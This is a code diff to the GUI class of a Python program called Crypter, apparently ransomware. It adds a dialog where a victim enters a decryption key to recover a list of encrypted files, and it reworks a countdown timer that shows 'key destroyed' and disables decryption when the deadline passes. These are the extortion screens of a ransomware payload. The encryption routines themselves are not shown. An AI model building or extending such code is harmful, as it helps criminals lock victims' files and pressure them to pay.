@@ -3,7 +3,6 @@
 @summary: Crypter: GUI Class
 @author: MLS
 @version: 1.70
-@todo: Continue from Decryption dialog functionality (decrypt method)
 '''
 
 # Import libs
@@ -63,7 +62,6 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		self.Bind(wx.EVT_TIMER, self.blink, self.key_destruction_timer)
 		
 		# Create button events
-		# TODO Continue with implementing new dialogoues and their functionality
 		self.Bind(wx.EVT_BUTTON, self.show_encrypted_files, self.ViewEncryptedFilesButton)
 		self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
 		
@@ -74,22 +72,60 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		'''
 		
 		# Create dialog object
-		decryption_dialog = EnterDecryptionKeyDialog(self)
+		self.decryption_dialog = EnterDecryptionKeyDialog(self)
 		
 		# Bind OK button to decryption process
-		decryption_dialog.Bind(wx.EVT_BUTTON, self.decrypt, decryption_dialog.OkCancelSizerOK)
-		decryption_dialog.Show()
+		self.decryption_dialog.Bind(wx.EVT_BUTTON, self.decrypt, self.decryption_dialog.OkCancelSizerOK)
+		self.decryption_dialog.Show()
 		
 		
-	
 	def decrypt(self, event):
 		'''
 		@summary: Handles the decryption process from a GUI level
 		'''
 		
 		# Check for valid key
-		print("Hello!")
+		key_contents = self.decryption_dialog.DecryptionKeyTextCtrl.GetLineText(0)
+		if len(key_contents) < 32:
+			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY)
+			return
+		else:
+			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING)
 		
+		wx.Yield()
+		# Start the decryption
+		# Disable dialog buttons
+		self.decryption_dialog.OkCancelSizerOK.Disable()
+		self.decryption_dialog.OkCancelSizerCancel.Disable()
+		
+		# Get list of encrypted files and update gauge
+		encrypted_files_list = self.decrypter.get_encrypted_file_list()
+		self.decryption_dialog.DecryptionGauge.SetRange(len(encrypted_files_list))
+
+		# Iterate file list and decrypt
+		decrypted_file_list = []
+		for encrypted_file in encrypted_files_list:
+			self.decrypter.decrypt_file(encrypted_file, key_contents)
+			decrypted_file_list.append(encrypted_file)
+			self.decryption_dialog.DecryptionGauge.SetValue(len(decrypted_file_list))
+			wx.Yield()
+			
+		# Decryption complete
+		self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED)
+		self.decrypter.cleanup()
+		
+		# Re-enable button
+		self.decryption_dialog.OkCancelSizerCancel.Enable()
+		
+		# Update main window
+		self.key_destruction_timer.Stop()
+		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED)
+		self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
+		self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED)
+		self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
+		
+		# Disable decrypt button
+		self.EnterDecryptionKeyButton.Disable()
 		
 
 	def show_encrypted_files(self, event):
@@ -98,18 +134,18 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		'''
 		
 		# Create dialog object
-		encrypted_files_dialog = ViewEncryptedFilesDialog(self)
+		self.encrypted_files_dialog = ViewEncryptedFilesDialog(self)
 
 		# If the list of encrypted files exists, load contents
 		if os.path.isfile(self.encrypted_file_list):
-			encrypted_files_dialog.EncryptedFilesTextCtrl.LoadFile(self.encrypted_file_list)
+			self.encrypted_files_dialog.EncryptedFilesTextCtrl.LoadFile(self.encrypted_file_list)
 		# Otherwise set to none found
 		else:
-			encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
-				"A list of encrypted files was not found")
+			self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
+				self.GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND)
 		
 		
-		encrypted_files_dialog.Show()
+		self.encrypted_files_dialog.Show()
 
 		
 	def blink(self, event):
@@ -128,15 +164,18 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		# Update the time remaining
 		time_remaining = self.get_time_remaining()
-		self.KeyDestructionTime.SetLabelText(time_remaining)
 		
 		# If the key has been destroyed, update the menu text
-		if time_remaining.lower() == "key destroyed":
+		# TODO Test
+		if not time_remaining:
+			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED)
 			# Set timer colour to black
 			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
 				wx.SYS_COLOUR_CAPTIONTEXT))
 			# Disable decryption button
 			self.EnterDecryptionKeyButton.Disable()
+		else:
+			self.KeyDestructionTime.SetLabelText(time_remaining)
 		
 		
 	def get_time_remaining(self):
@@ -150,7 +189,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		_time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
 		if _time_remaining <= 0:
-			return "KEY DESTROYED"
+			return None
 		
 		minutes, seconds = divmod(_time_remaining, 60)
 		hours, minutes = divmod(minutes, 60)
